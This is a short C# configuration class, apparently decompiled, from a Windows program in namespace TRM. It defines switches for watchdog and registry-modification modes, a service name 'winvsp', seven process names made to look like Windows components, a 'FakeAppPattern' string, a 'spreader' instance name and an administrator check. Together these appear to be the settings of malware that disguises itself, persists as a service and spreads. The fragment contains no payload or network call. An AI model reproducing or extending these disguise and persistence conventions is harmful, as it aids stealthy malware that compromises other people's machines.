using System.IO;
using System.Security.Principal;
using System.Windows.Forms;

namespace TRM;

public class AppConfig
{
	public const string ArgWatchMe = "wm";

	public const string ArgWatchSvc = "ws";

	public const string ArgModifyRegistry = "rg";

	public static readonly string AppInstanceService = "AppInstanceService";

	public static readonly string AppInstanceAdminRole = "AppInstanceAdminRole";

	public static readonly string ServiceName = "winvsp";

	public static readonly string FakeAppPattern = "_back";

	private static long _appSize;

	public static readonly string[] AppNames = new string[7] { "winvsp", "vspmem", "wmcsp", "svcvsp", "vspconsole", "dvm", "vspmng" };

	public static volatile bool AppIsRunning = true;

	public static string AppInstanceSpreader => "AppInstanceSpreader" + AdministratorIsInRole();

	private static long AppFileSize__
	{
		get
		{
			if (_appSize == 0L)
			{
				FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
				_appSize = fileInfo.Length;
			}
			return _appSize;
		}
	}

	private static bool AdministratorIsInRole()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
